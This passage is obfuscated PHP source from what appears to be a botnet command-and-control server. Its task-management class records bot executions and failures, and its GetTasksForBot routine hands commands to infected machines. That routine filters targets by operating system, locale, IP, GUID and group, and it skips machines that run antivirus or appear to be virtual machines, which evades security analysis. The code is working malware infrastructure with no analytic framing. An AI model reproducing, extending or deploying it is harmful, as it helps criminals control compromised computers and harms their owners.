            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_DELETE, "All expired tasks deleted");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function IncrementBotsPerformedTaskCounter($task_id)
    {
        if (parent::Query("UPDATE " . $this->pdbname . ".tasks SET bots_executed = bots_executed + 1 WHERE id = " . $task_id)) {
            return true;
        }
        return false;
    }
    public function IsTaskExpired($expiration_date)
    {
        if ((int) $expiration_date <= time()) {
            return true;
        }
        return false;
    }
    public function IncrementTaskFailureCount($bot_id, $task_unique_tb_id)
    {
        if (is_numeric($task_unique_tb_id) === false || is_numeric($bot_id) === false) {
            return NULL;
        }
        $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ = (int) $task_unique_tb_id;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = NULL;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET bots_failed = bots_failed + 1 WHERE tb_id = '" . $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ . "' LIMIT 1");
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks_completed SET completion_status = " . TASK_COMPLETION_STATUS_ERROR . " WHERE client_id = " . $bot_id . " AND task_tb_id = " . $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ . " LIMIT 1");
        return $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_;
    }
    public function SetTaskCompletionStatusAndUpdateTaskErrorCount($bot_id, $task_unique_tb_id, $completion_status)
    {
        if (is_numeric($task_unique_tb_id) === false || is_numeric($bot_id) === false) {
            return NULL;
        }
        $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ = (int) $task_unique_tb_id;
        $completion_status = (int) $completion_status;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = NULL;
        if ($completion_status & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
            $completion_status &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
        }
        if ((int) $completion_status & TASK_COMPLETION_STATUS_ERROR) {
            $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET bots_failed = bots_failed + 1 WHERE tb_id = '" . $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ . "' LIMIT 1");
        }
        if ((int) $completion_status != 0) {
            $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks_completed SET completion_status = '" . $completion_status . "' WHERE client_id = " . $bot_id . " AND task_tb_id = " . $_obfuscated_0D250A13320D32233940403B252E1414122631150A1F11_ . " LIMIT 1");
        }
        return $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_;
    }
    public function SetBotTaskCompletionRecordMessage($bot_id, $task_tb_id, $comp_message)
    {
        $comp_message = bin2hex($comp_message);
        $task_tb_id = (int) $task_tb_id;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks_completed SET completion_message = UNHEX('" . $comp_message . "') WHERE client_id = " . $bot_id . " AND task_tb_id = " . $task_tb_id . " LIMIT 1");
        return $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_;
    }
    public function AddBotFinishedTask($bot_id, $task_id, $task_tb_id)
    {
        $task_tb_id = (int) $task_tb_id;
        parent::Query("INSERT INTO " . $this->pdbname . ".tasks_completed VALUES(NULL, '" . $bot_id . "', UNIX_TIMESTAMP(NOW()), '" . $task_id . "', '" . $task_tb_id . "', '0', '');");
        return $this->IncrementBotsPerformedTaskCounter($task_id);
    }
    public function QueryBotTaskCompletionStatus($bot_id, $task_id)
    {
        $_obfuscated_0D19401F36282E3E0F1534085B241F3733301E15150432_ = parent::Query("SELECT id FROM " . $this->pdbname . ".tasks_completed WHERE client_id = '" . $bot_id . "' AND task_id = '" . $task_id . "' LIMIT 1");
        if ($_obfuscated_0D19401F36282E3E0F1534085B241F3733301E15150432_ && @mysql_num_rows($_obfuscated_0D19401F36282E3E0F1534085B241F3733301E15150432_) == 1) {
            @mysql_free_result($_obfuscated_0D19401F36282E3E0F1534085B241F3733301E15150432_);
            return true;
        }
        return false;
    }
    public function ClearTaskCompletionRecords($task_id)
    {
        $_obfuscated_0D2634353B0902080F1A2B0702033F303C231D122E2D01_ = parent::Query("DELETE FROM " . $this->pdbname . ".tasks_completed WHERE task_id = " . $task_id);
        if ($_obfuscated_0D2634353B0902080F1A2B0702033F303C231D122E2D01_) {
            return true;
        }
        return false;
    }
    public function ClearAllTaskCompletionRecords()
    {
        parent::Query("TRUNCATE TABLE " . $this->pdbname . ".tasks_completed");
    }
    public function write_task_error_log($err_string = "")
    {
        if (@strlen($err_string) == 0) {
            return false;
        }
        $err_string .= "\r\n";
        $fp = @fopen("task_err.txt", "a");
        if ($fp) {
            @fwrite($fp, $err_string);
            @fclose($fp);
            return true;
        }
        return false;
    }
    public function GetTasksForBot($botClientObject, &$last_task_id, $request_type)
    {
        if ($botClientObject == NULL) {
            return "";
        }
        global $sqlSettings;
        $_obfuscated_0D1C1F2618292B1031293F02052C0C1C1427405C5C2401_ = NULL;
        $_obfuscated_0D35153B5B342C142A193C250C132322352F19215B1811_ = false;
        $_obfuscated_0D11172D3113280C0F5B3211403F2B5B0B3F2E04353B01_ = false;
        $_obfuscated_0D5B102940010F16163B050A26231A2B5B403E38295B11_ = 0;
        if (32 <= strlen($sqlSettings->LastTasksRevisionHash) && strcasecmp($botClientObject->Bot_LastTasksHash, $sqlSettings->LastTasksRevisionHash) == 0) {
            return "";
        }
        if ($sqlSettings->General_Options & GENERAL_OPTION_SEND_UPDATE_TASK_ONLY_ON_CHECKIN && !($request_type & BOT_REQUEST_TYPE_CHECK_IN) && !($request_type & BOT_REQUEST_TYPE_UPDATE_STATISTICS)) {
            $_obfuscated_0D11172D3113280C0F5B3211403F2B5B0B3F2E04353B01_ = true;
        }
        $_obfuscated_0D1C1F2618292B1031293F02052C0C1C1427405C5C2401_ = $this->GetActiveTasks();
        if ($_obfuscated_0D1C1F2618292B1031293F02052C0C1C1427405C5C2401_ != NULL) {
            global $sqlGeoIP;
            $_obfuscated_0D331F12381A3F3D030F3C261808102127372135290332_ = new CBotCommands();
            $_obfuscated_0D0618311125100B0E31372D2C3D3D1E263C2433260332_ = $_obfuscated_0D331F12381A3F3D030F3C261808102127372135290332_->CreateCommandBuffer(0);
            $_obfuscated_0D2F133425041714092902185C3D0837041A311C231601_ = $_SERVER["REMOTE_ADDR"];
            $_obfuscated_0D3640122D1117183632030D192E28152D2E13091B3922_ = bin2hex($botClientObject->Machine_GUID);
            $_obfuscated_0D030A163E0C07062E3D150B303D16255B013903160401_ = 0;
            while ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = @mysql_fetch_assoc($_obfuscated_0D1C1F2618292B1031293F02052C0C1C1427405C5C2401_)) {
                $_obfuscated_0D351632043D22402F0E19325B07230130210B2D1F1C11_ = $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["id"];
                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                $_obfuscated_0D25360E060E17260E1A110314305C2A042D091E161F32_ = (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["bots_executed"];
                $_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ = (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_general_flags"];
                $_obfuscated_0D062C091D1A3734313D05323C2633270E123E1D5C2432_ = strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["command"]);
                if ($_obfuscated_0D062C091D1A3734313D05323C2633270E123E1D5C2432_ < 2 || 1024 < $_obfuscated_0D062C091D1A3734313D05323C2633270E123E1D5C2432_) {
                    continue;
                }
                if (substr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["command"], 1, strlen(COMMAND_STRING_UPDATE)) === COMMAND_STRING_UPDATE && $_obfuscated_0D11172D3113280C0F5B3211403F2B5B0B3F2E04353B01_ == true) {
                    $_obfuscated_0D5B102940010F16163B050A26231A2B5B403E38295B11_++;
                    continue;
                }
                if (strcasecmp($this->HashTaskCommandString($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["command"]), $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["cmd_hash"]) != 0) {
                    continue;
                }
                if ($this->IsTaskExpired($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["expiration_date"]) == true) {
                    continue;
                }
                if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_flags"] != TASK_FILTER_ATTRIB_ALL) {
                    for ($i = 0; $i < 32; $i++) {
                        if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_flags"] & 1 << $i && $botClientObject->Bot_Attributes & 1 << $i) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = true;
                        } else {
                            if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_flags"] & 1 << $i && !($botClientObject->Bot_Attributes & 1 << $i)) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                                break;
                            }
                        }
                    }
                } else {
                    $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = true;
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true) {
                    $_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ = (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_general_flags"];
                    if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ != TASK_FILTER_GENERAL_OPTIONS_ALL) {
                        $_obfuscated_0D01250F36070A07181E223E1B1227400935112E323D32_ = (int) time() - (int) $botClientObject->Bot_FirstCheckIn;
                        if ($botClientObject->Bot_FirstCheckIn == $botClientObject->Bot_LastCheckIn) {
                            $_obfuscated_0D01250F36070A07181E223E1B1227400935112E323D32_ = 0;
                        }
                        if (!($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_32BIT) || !($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_64BIT)) {
                            if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_32BIT && !($botClientObject->Bot_OS & WINDOWS_VERSION_BIT_32)) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            } else {
                                if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_64BIT && !($botClientObject->Bot_OS & WINDOWS_VERSION_BIT_64)) {
                                    $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                                }
                            }
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_NO_ANTIVIRUS && $botClientObject->Avs_Installed != 0) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_NO_VIRTUAL_MACHINE && $botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_VIRTUAL_MACHINE) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_NEW_CLIENT_ONLY && $botClientObject->Bot_FirstCheckIn != $botClientObject->Bot_LastCheckIn) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_OLD_CLIENT_ONLY && (int) $_obfuscated_0D01250F36070A07181E223E1B1227400935112E323D32_ < 84600) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_OLD6H_CLIENT_ONLY && (int) $_obfuscated_0D01250F36070A07181E223E1B1227400935112E323D32_ < 21600) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_IGNORE_IF_DIRTY && $botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_DIRTY) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_APPLY_IF_DIRTY && !($botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_DIRTY)) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_ONLY_FAVORITES && !($botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_FAVORITE)) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_NO_FAVORITES && $botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_FAVORITE) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                        if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ != false) {
                        }
                        $_obfuscated_0D0D2B210530291D29011F081327153F27350D13272532_ = 0;
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true && 6 < strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_hosts"]) && 6 < strlen($_obfuscated_0D2F133425041714092902185C3D0837041A311C231601_)) {
                    if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_ALL_BUT_IPS) {
                        if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_hosts"], $_obfuscated_0D2F133425041714092902185C3D0837041A311C231601_) == true) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                    } else {
                        if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_hosts"], $_obfuscated_0D2F133425041714092902185C3D0837041A311C231601_) == false) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true && 31 < strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_guids"])) {
                    if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_ALL_BUT_GUIDS) {
                        if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_guids"], $_obfuscated_0D3640122D1117183632030D192E28152D2E13091B3922_) == true) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                    } else {
                        if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_guids"], $_obfuscated_0D3640122D1117183632030D192E28152D2E13091B3922_) == false) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true && isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_groups"]) && 1 < strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_groups"])) {
                    $_obfuscated_0D180E212F1E5C040B1F39243E342407112D15071D0311_ = strlen($botClientObject->GroupName);
                    if ($_obfuscated_0D180E212F1E5C040B1F39243E342407112D15071D0311_ == 0 || 12 < $_obfuscated_0D180E212F1E5C040B1F39243E342407112D15071D0311_) {
                        $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                    }
                    if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true) {
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_ALL_BUT_GROUPS) {
                            if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_groups"], $botClientObject->GroupName) == true) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            }
                        } else {
                            if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_groups"], $botClientObject->GroupName) == false) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            }
                        }
                    }
                }
                if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_software"] != TASK_FILTER_SOFTWARE_ALL) {
                    for ($i = 0; $i < 32; $i++) {
                        if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_software"] & 1 << $i && $botClientObject->Software_Installed & 1 << $i) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = true;
                            break;
                        }
                        if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_software"] & 1 << $i && !($botClientObject->Software_Installed & 1 << $i)) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            break;
                        }
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true) {
                    $_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ = false;
                    if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_os"] != TASK_FILTER_OS_ALL) {
                        for ($i = 0; $i < 32; $i++) {
                            if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_os"] & 1 << $i && $botClientObject->Bot_OS & 1 << $i) {
                                $_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ = true;
                                break;
                            }
                        }
                        if ($_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ == false) {
                            $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                        }
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true && 1 < strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_locales"])) {
                    if (!isset($botClientObject->Bot_Locale) || @strlen($botClientObject->Bot_Locale) < 2) {
                        $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                    }
                    if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true) {
                        if ($_obfuscated_0D0A31240A1C3C3034081E08393D052A01352418293632_ & TASK_GENERAL_OPTION_ALL_BUT_COUNTRIES) {
                            if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_locales"], $botClientObject->Bot_Locale) == true) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            }
                        } else {
                            if (stristr($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_locales"], $botClientObject->Bot_Locale) == false) {
                                $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                            }
                        }
                    }
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true && $this->QueryBotTaskCompletionStatus($botClientObject->Bot_RecordID, $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["id"]) == true) {
                    $_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ = false;
                }
                if ($_obfuscated_0D3C11092B2C0E393403263F1A21130C1E0A362D1C2832_ == true) {
                    $_obfuscated_0D1D38261B1012131A032336250F245B22180B19172E22_ = isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["extended_command"]) ? $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["extended_command"] : NULL;
                    $_obfuscated_0D25360E060E17260E1A110314305C2A042D091E161F32_++;
                    $_obfuscated_0D0618311125100B0E31372D2C3D3D1E263C2433260332_ = $_obfuscated_0D331F12381A3F3D030F3C261808102127372135290332_->AddCommand($_obfuscated_0D0618311125100B0E31372D2C3D3D1E263C2433260332_, 0, $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["tb_id"], $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["command"], $_obfuscated_0D1D38261B1012131A032336250F245B22180B19172E22_, $botClientObject);
                    $_obfuscated_0D030A163E0C07062E3D150B303D16255B013903160401_++;
                    $last_task_id = (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["id"];
                    $_obfuscated_0D032D0E1729320D240E311B11193F5B2D243F36041832_ = isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["tb_id"]) ? (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["tb_id"] : 0;
                    $this->AddBotFinishedTask($botClientObject->Bot_RecordID, $last_task_id, $_obfuscated_0D032D0E1729320D240E311B11193F5B2D243F36041832_);
                    if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_general_flags"] & TASK_GENERAL_OPTION_MARK_AS_DIRTY && !($botClientObject->Bot_RecordAttributes & BOT_RECORD_IS_DIRTY)) {
                        $_obfuscated_0D35153B5B342C142A193C250C132322352F19215B1811_ = true;
                    }
                }
                if ((int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["max_bots"] <= $_obfuscated_0D25360E060E17260E1A110314305C2A042D091E161F32_ || $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["expiration_date"] <= time()) {
                    $this->SetTaskFinished($_obfuscated_0D351632043D22402F0E19325B07230130210B2D1F1C11_);
                }
            }
            if (0 < $_obfuscated_0D030A163E0C07062E3D150B303D16255B013903160401_) {
                $_obfuscated_0D2F1E1E161E38371F173610281408302F261705133211_ = "";
                if ($_obfuscated_0D35153B5B342C142A193C250C132322352F19215B1811_ == true) {
                    if ($_obfuscated_0D5B102940010F16163B050A26231A2B5B403E38295B11_ == 0) {
                        $_obfuscated_0D2F1E1E161E38371F173610281408302F261705133211_ = "UPDATE " . $this->pdbname . ".clients SET last_tasks_hash = '" . $sqlSettings->LastTasksRevisionHash . "', RecordAttributes = (RecordAttributes | " . (int) BOT_RECORD_IS_DIRTY . ") WHERE id = '" . $botClientObject->Bot_RecordID . "' LIMIT 1";
                    } else {
                        $_obfuscated_0D2F1E1E161E38371F173610281408302F261705133211_ = "UPDATE " . $this->pdbname . ".clients SET RecordAttributes = (RecordAttributes | " . (int) BOT_RECORD_IS_DIRTY . ") WHERE id = '" . $botClientObject->Bot_RecordID . "' LIMIT 1";
                    }
                } else {
                    if ($_obfuscated_0D5B102940010F16163B050A26231A2B5B403E38295B11_ == 0) {
                        $_obfuscated_0D2F1E1E161E38371F173610281408302F261705133211_ = "UPDATE " . $this->pdbname . ".clients SET last_tasks_hash = '" . $sqlSettings->LastTasksRevisionHash . "' WHERE id = '" . $botClientObject->Bot_RecordID . "' LIMIT 1";
                    }
                }
                $botClientObject->Query($_obfuscated_0D2F1E1E161E38371F173610281408302F261705133211_);
                return $_obfuscated_0D331F12381A3F3D030F3C261808102127372135290332_->SetCommandCount($_obfuscated_0D0618311125100B0E31372D2C3D3D1E263C2433260332_, $_obfuscated_0D030A163E0C07062E3D150B303D16255B013903160401_);
            }
            $_obfuscated_0D351632043D22402F0E19325B07230130210B2D1F1C11_ = 0;
        }
    }
}

?>